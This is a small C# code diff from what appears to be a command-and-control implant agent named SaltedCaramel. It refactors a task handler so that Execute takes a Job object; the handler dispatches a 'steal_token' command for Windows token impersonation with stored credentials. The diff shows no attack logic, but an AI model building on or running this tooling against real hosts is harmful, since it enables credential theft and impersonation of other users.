@@ -6,6 +6,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security;
 using System.Security.Principal;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
@@ -23,8 +24,9 @@ namespace SaltedCaramel.Tasks
         public static Credential Cred;
         // (username, (password, netonly))
 
-        public static void Execute(SCTask task, SCImplant agent)
+        public static void Execute(Job job, SCImplant agent)
         {
+            SCTask task = job.Task;
             if (task.command == "steal_token")
             {
                 StealToken(task);
